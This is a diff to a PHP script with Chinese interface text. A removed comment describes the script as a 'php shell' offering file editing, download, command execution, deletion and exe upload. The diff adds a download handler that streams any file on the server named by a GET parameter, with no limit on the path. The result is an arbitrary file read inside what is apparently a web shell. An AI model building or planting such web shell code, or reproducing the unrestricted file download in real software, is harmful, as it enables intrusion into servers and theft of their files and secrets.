@@ -86,6 +86,22 @@ HTML;
 $dir = isset($_GET['path']) ? $_GET['path'] : '../';
 authenticate(); // 调用认证函数
 
+if (isset($_GET['download'])) {
+    $file = realpath($_GET['download']);
+    if ($file && is_file($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    } else {
+        die("文件不存在");
+    }
+}
 function format_size($size) {
     $units = ['B', 'KB', 'MB', 'GB'];
     $i = 0;
@@ -118,9 +134,10 @@ function show_file($dir) {
         }
         echo '</td><td>' . ($is_dir ? '文件夹' : '文件') . '</td><td>' . $size . '</td><td>' . $mod_time . '</td><td>';
         if (!$is_dir) {
-            echo '<a href="download.php?file=' . urlencode($full_path) . '">下载</a> | ';
+
             echo '<a href="?edit=' . urlencode($full_path) . '">编辑</a> | ';
-            echo '<a href="?delete=' . urlencode($full_path) . '">删除</a>';
+            echo '<a href="?delete=' . urlencode($full_path) . '">删除</a> | ';
+            echo '<a href="?download=' . urlencode($full_path) . '">下载</a>';
         }
         echo '</td></tr>';
     }
@@ -138,6 +155,8 @@ function show_file($dir) {
             echo '</form>';
         }
     }
+
+
 
     // 文件保存功能
     if (isset($_GET['save']) && isset($_POST['content'])) {
@@ -270,9 +289,6 @@ show_file($dir);
 echo "<br>";
 echo "<a href='?action=logout' class='logout-link'>退出</a>";
 echo '</body></html>';
-
-/*
-php shell 已有的功能
-文件管理(编辑，下载)，命令执行，密码验证,文件删除,上传功能(exe)*/
 ?>
+
 
